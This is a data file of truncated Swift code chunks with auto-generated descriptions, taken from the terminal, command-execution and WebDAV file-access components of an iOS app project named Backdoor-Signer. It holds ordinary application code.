3419,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Components/TerminalTextView.swift","Create notification for interface style changes","extension NSNotification.Name {
static let didChangeUserInterfaceStyle = NSNotification.Name(""didChangeUserInterfaceStyle"")
}
"
3420,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","enum TerminalError - implements functionality related to terminal error","enum TerminalError: Error {
case invalidURL
case networkError(String)
case responseError(String)
case sessionError(String)
case parseError(String)
case executionError(String)
case localError(String)
}
"
3421,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ TerminalService - Provides terminal functionality / This is an updated version that uses a local implementation instead of a web server","class TerminalService {
static let shared = TerminalService()

private var sessionId: String?
private let logger = Debug.shared

// Local service for on-device execution
private let localService = LocalTerminalService.shared

// Output handlers"
3422,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","MARK: - Session Management / Creates a new terminal session","func createSession(completion: @escaping (TerminalResult<String>) -> Void) {
logger.log(message: ""Creating new terminal session"", type: .info)

localService.createSession { result in"
3423,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ Executes a command in the current session","func executeCommand(
_ command: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (TerminalResult<Void>) -> Void
) {"
3424,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ Executes a command in a specific session","private func executeCommandInSession(
_ command: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (TerminalResult<Void>) -> Void
) {"
3425,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ Sends input to a running process","func sendInput(
_ input: String,
completion: @escaping (TerminalResult<Void>) -> Void
) {"
3426,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ Terminates the current session","func terminateSession(completion: @escaping (TerminalResult<Void>) -> Void) {
guard let sessionId = sessionId else {"
3427,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ Resizes the terminal session (placeholder for compatibility) / Local implementation doesn't need resizing but we keep the method for API compatibility","func resizeSession(cols: Int, rows: Int, completion: @escaping (TerminalResult<Void>) -> Void) {
// Local implementation doesn't need explicit resizing
completion(.success(()))
}

/// Alias for terminateSession to maintain backward compatibility
func endSession(completion: @escaping (TerminalResult<Void>) -> Void) {"
3428,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ Alias for terminateSession to maintain backward compatibility","func endSession(completion: @escaping (TerminalResult<Void>) -> Void) {
terminateSession(completion: completion)
}
}

// Legacy wrapper class for compatibility
class ProcessUtility {"
3429,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","Legacy wrapper class for compatibility","class ProcessUtility {
static let shared = ProcessUtility()
private let logger = Debug.shared

private init() {}"
3430,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ Executes a shell command and returns the output. / - Parameters: /   - command: The shell command to be executed. /   - completion: A closure to be called with the command's output or an error message.","func executeShellCommand(_ command: String, completion: @escaping (String?) -> Void) {
var output = """"

logger.log(message: ""ProcessUtility executing command: \(command)"", type: .info)

TerminalService.shared.executeCommand(command, outputHandler: { newOutput in"
3431,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalService.swift","/ Executes a shell command with real-time output streaming. / - Parameters: /   - command: The shell command to be executed. /   - outputHandler: Real-time handler for command output chunks. /   - completion: A closure to be called when the command completes.","func executeShellCommandWithStreaming(
_ command: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (String?) -> Void
) {"
3432,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - WebDAV Models","struct WebDAVCredentials: Codable {
let url: String
let username: String
let password: String
let protocolType: String

enum CodingKeys: String, CodingKey {"
3433,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","enum CodingKeys - implements functionality related to coding keys","enum CodingKeys: String, CodingKey {
case url
case username
case password
case protocolType = ""protocol""
}
}

struct WebDAVResponse: Codable {"
3434,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","struct WebDAVResponse - implements functionality related to web d a v response","struct WebDAVResponse: Codable {
let credentials: WebDAVCredentials
let instructions: [String]
let clients: WebDAVClients?
}

struct WebDAVClients: Codable {"
3435,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","struct WebDAVClients - implements functionality related to web d a v clients","struct WebDAVClients: Codable {
let ios: [String]?
let macos: [String]?
let windows: [String]?
let android: [String]?
}

class TerminalViewController: UIViewController {"
3436,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","class TerminalViewController - Controls user interface and application flow","class TerminalViewController: UIViewController {
// MARK: - UI Components

private let terminalOutputTextView = TerminalTextView()
private let commandInputView = CommandInputView()
private let activityIndicator = UIActivityIndicatorView(style: .medium)
private let toolbar = UIToolbar()
private let connectionStatusView = UIView()

// MARK: - Properties"
3437,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
setupConstraints()
setupKeyboardNotifications()
setupActions()

// Load user preferences
loadUserPreferences()
"
3438,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function loadUserPreferences - implements loaduserpreferences functionality","private func loadUserPreferences() {
// Load WebSocket preference from UserDefaults
if UserDefaults.standard.object(forKey: ""terminal_websocket_enabled"") != nil {"
3439,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function saveUserPreferences - implements saveuserpreferences functionality","private func saveUserPreferences() {
// Save WebSocket preference to UserDefaults
UserDefaults.standard.set(userPreferenceWebSockets, forKey: ""terminal_websocket_enabled"")
}

private func setupConnectionStatusTimer() {"
3440,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function setupConnectionStatusTimer - sets upconnectionstatustimer","private func setupConnectionStatusTimer() {
// Update connection status every 3 seconds
Timer.scheduledTimer(withTimeInterval: 3.0, repeats: true) { [weak self] _ in"
3441,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function updateTitle - updates title","private func updateTitle() {
// Update navigation title to include connection mode
if isWebSocketConnected {"
3442,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
commandInputView.becomeFirstResponder()
}

override func viewWillDisappear(_ animated: Bool) {"
3443,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)
// Save command history when leaving view
history.saveHistory()
}

override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {"
3444,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)
if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
3445,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - UI Setup","private func setupUI() {
view.backgroundColor = UIColor(named: ""Background"") ?? UIColor.systemBackground

// Set navigation bar title and style
title = ""Terminal""
navigationItem.largeTitleDisplayMode = .never

// Add a close button if presented modally
if presentingViewController != nil {"
3446,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function updateConnectionStatus - updates connectionstatus","private func updateConnectionStatus() {
// Check if local terminal service is active
isWebSocketConnected = TerminalService.shared.isWebSocketActive

// Update connection status indicator - always green for local implementation
connectionStatusView.backgroundColor = .systemGreen

// Update title to show local mode
title = ""Terminal [Local]""
"
3447,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function showLanguageHelp - implements showlanguagehelp functionality","@objc private func showLanguageHelp() {
// Display help about the custom programming language
appendToTerminal(""\n"", isInput: false)

let helpText = """"""
Backdoor Custom Programming Language
===================================

The custom language supports both Swift and Python execution with
seamless interoperability between them."
3448,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function setupToolbar - sets uptoolbar","private func setupToolbar() {
let flexSpace = UIBarButtonItem(barButtonSystemItem: .flexibleSpace, target: nil, action: nil)

let clearButton = UIBarButtonItem(
image: UIImage(systemName: ""trash""),
style: .plain,
target: self,
action: #selector(clearTerminal)
)
clearButton.accessibilityLabel = ""Clear Terminal"""
3449,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function updateToolbarButtons - updates toolbarbuttons","private func updateToolbarButtons() {
// No WebSocket status to update - always in local mode
}

private func setupConstraints() {"
3450,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
terminalOutputTextView.translatesAutoresizingMaskIntoConstraints = false
commandInputView.translatesAutoresizingMaskIntoConstraints = false
activityIndicator.translatesAutoresizingMaskIntoConstraints = false
connectionStatusView.translatesAutoresizingMaskIntoConstraints = false

NSLayoutConstraint.activate([
// Terminal output
terminalOutputTextView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
terminalOutputTextView.leadingAnchor.constraint(equalTo: view.leadingAnchor),"
3451,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function setupKeyboardNotifications - sets upkeyboardnotifications","private func setupKeyboardNotifications() {
NotificationCenter.default.addObserver(
self,
selector: #selector(keyboardWillShow),
name: UIResponder.keyboardWillShowNotification,
object: nil
)

NotificationCenter.default.addObserver(
self,"
3452,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function setupActions - sets upactions","private func setupActions() {
let tapGesture = UITapGestureRecognizer(target: self, action: #selector(handleTap))
terminalOutputTextView.addGestureRecognizer(tapGesture)
}

// MARK: - Terminal Functions

private func executeCommand(_ command: String) {"
3453,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - Terminal Functions","private func executeCommand(_ command: String) {
guard !command.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else {"
3454,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Append streaming output to terminal","private func appendToTerminalStreaming(_ text: String) {
guard !text.isEmpty else { return }"
3455,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function appendToTerminal - implements appendtoterminal functionality","private func appendToTerminal(_ text: String, isInput: Bool) {
let attributedString = NSMutableAttributedString(string: text)

// Get the appropriate color based on text type and theme
let colorTheme = UserDefaults.standard.integer(forKey: ""terminal_color_theme"")

if isInput {"
3456,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function scrollToBottom - implements scrolltobottom functionality","private func scrollToBottom() {
if !terminalOutputTextView.text.isEmpty {"
3457,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - Actions","@objc private func clearTerminal() {
terminalOutputTextView.text = """"
appendToTerminal(""$ "", isInput: false)
}

@objc private func historyUp() {"
3458,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function historyUp - implements historyup functionality","@objc private func historyUp() {
if let previousCommand = history.getPreviousCommand() {"
3459,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function historyDown - implements historydown functionality","@objc private func historyDown() {
if let nextCommand = history.getNextCommand() {"
3460,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function insertTab - implements inserttab functionality","@objc private func insertTab() {
commandInputView.insertText(""\t"")
}

@objc private func sendCtrlC() {"
3461,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function sendCtrlC - implements sendctrlc functionality","@objc private func sendCtrlC() {
if isExecuting {"
3462,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function handleTap - implements handletap functionality","@objc private func handleTap() {
commandInputView.becomeFirstResponder()
}

@objc private func keyboardWillShow(_: Notification) {"
3463,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function keyboardWillShow - implements keyboardwillshow functionality","@objc private func keyboardWillShow(_: Notification) {
scrollToBottom()
}

@objc private func keyboardWillHide(_: Notification) {"
3464,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function keyboardWillHide - implements keyboardwillhide functionality","@objc private func keyboardWillHide(_: Notification) {
// Handle keyboard hiding if needed
}

@objc private func dismissTerminal() {"
3465,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function dismissTerminal - implements dismissterminal functionality","@objc private func dismissTerminal() {
// Post notification to restore floating terminal button before dismissing
NotificationCenter.default.post(name: .showTerminalButton, object: nil)

// Also post to a more general notification that can be observed by other components
NotificationCenter.default.post(name: Notification.Name(""TerminalDismissed""), object: nil)

// Explicitly tell the FloatingButtonManager to show if available
DispatchQueue.main.async {"
3466,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - WebDAV File Access / Opens Files app with WebDAV connection to view terminal files","@objc private func viewFiles() {
// Show loading indicator
activityIndicator.startAnimating()

// Get WebDAV credentials for the current session
getWebDAVCredentials { [weak self] result in"
3467,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","/ Fetches WebDAV credentials from the server","private func getWebDAVCredentials(completion: @escaping (Result<WebDAVCredentials, Error>) -> Void) {
// First ensure we have a session
TerminalService.shared.getCurrentSessionId { [weak self] sessionId in"
3468,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","/ Opens the WebDAV location in Files app","private func openWebDAVLocation(credentials: WebDAVCredentials) {
// Create WebDAV URL with embedded credentials
guard var urlComponents = URLComponents(string: credentials.url) else {"
3469,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","/ Creates a temporary WebDAV bookmark file","private func createWebDAVBookmark(for url: URL, completion: @escaping (Result<URL, Error>) -> Void) {
let tempDir = FileManager.default.temporaryDirectory
let bookmarkFile = tempDir.appendingPathComponent(""webdav_bookmark.webdavloc"")

let plistContent = """"""
<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
<key>URL</key>"
3470,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","/ Show instructions for manually connecting to WebDAV","private func showWebDAVInstructions(credentials: WebDAVCredentials) {
// Create alert with instructions and credentials
let alert = UIAlertController(
title: ""Connect to Files"",
message: """"""
To access your terminal files:

1. Open the Files app
2. Tap Browse > Three dots (•••) > Connect to Server
3. Enter the following:"
3471,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - Helper Methods / Show a quick toast message","private func showToast(message: String) {
let toastLabel = UILabel()
toastLabel.backgroundColor = UIColor.black.withAlphaComponent(0.7)
toastLabel.textColor = .white
toastLabel.textAlignment = .center
toastLabel.font = UIFont.systemFont(ofSize: 14)
toastLabel.text = message
toastLabel.alpha = 0
toastLabel.layer.cornerRadius = 10
toastLabel.clipsToBounds = true"
3472,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","/ Show error alert","private func showErrorAlert(title: String, message: String) {
let alert = UIAlertController(title: title, message: message, preferredStyle: .alert)
alert.addAction(UIAlertAction(title: ""OK"", style: .default))
present(alert, animated: true)
}
}

// MARK: - UITextFieldDelegate

extension TerminalViewController: UITextFieldDelegate {"
3473,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - UITextFieldDelegate","extension TerminalViewController: UITextFieldDelegate {
func textFieldShouldReturn(_ textField: UITextField) -> Bool {"
3474,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","Function textFieldShouldReturn - implements textfieldshouldreturn functionality","func textFieldShouldReturn(_ textField: UITextField) -> Bool {
if let command = textField.text, !isExecuting {"
3475,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","MARK: - TerminalService Extensions","extension TerminalService {
/// Get the current session ID
func getCurrentSessionId(completion: @escaping (String?) -> Void) {"
3476,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Terminal/Core/TerminalViewController.swift","/ Get the current session ID","func getCurrentSessionId(completion: @escaping (String?) -> Void) {
// Get current session ID from the service
// Use the currentSessionId getter

if let sessionId = TerminalService.shared.currentSessionId {"
3477,cpp,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Private/UISheetPresentationControllerDetent+Private.h","Function UISheetPresentationControllerDetent - implements uisheetpresentationcontrollerdetent functionality","@interface UISheetPresentationControllerDetent (Private)
+ (UISheetPresentationControllerDetent *)_detentWithIdentifier:(NSString *)identifier constant:(CGFloat)constant;"
